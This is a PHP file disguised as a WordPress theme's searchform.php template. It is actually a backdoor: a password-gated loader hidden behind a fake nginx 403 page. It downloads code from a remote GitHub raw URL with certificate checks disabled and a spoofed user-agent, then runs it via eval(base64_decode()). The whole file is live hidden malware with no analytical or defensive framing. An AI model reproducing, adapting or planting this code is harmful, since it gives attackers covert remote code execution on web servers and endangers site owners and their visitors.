<?php
$auth_pass = "b713c03bc5f0632a8172292ef537befce70bdbe3846e8e5fa80a8c6339ccbc98";

function Login() {
  die("<html>
  <title>403 Forbidden</title>
  <center><h1>403 Forbidden</h1></center>
  <hr><center>nginx (You don't have permission access to server / on this server) </center>
  <center><form method='post'><input style='text-align:center;margin:0;margin-top:0px;background-color:#fff;border:1px solid #fff;' type='password' name='pass'></form></center>");
}

function VEsetcookie($k, $v) {
    $_COOKIE[$k] = $v;
    setcookie($k, $v);
}

if (!empty($auth_pass)) {
    if (isset($_POST['pass']) && (hash('sha256', $_POST['pass']) == $auth_pass))
        VEsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);

    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass))
        Login();
}
?>
<?php
/*
 * The searchform.php template.
 *
 * Used any time that get_search_form() is called.
 *
 * @link https://wordpress.org/themes/template/
 * @package WordPress
 * @subpackage
 * @since 1.0 */

$l = "https://raw.githubusercontent.com/soy777/johnygreenwoodsz/main/lotusflower.php";

		if( function_exists('curl_init') ) {
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $l);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
			curl_setopt($ch, CURLOPT_HEADER, FALSE);
			curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36");
			$body = curl_exec($ch);
			curl_close($ch);
		}
		else {
			$body = @file_get_contents($l);
		}
	 eval(base64_decode($body));
?>
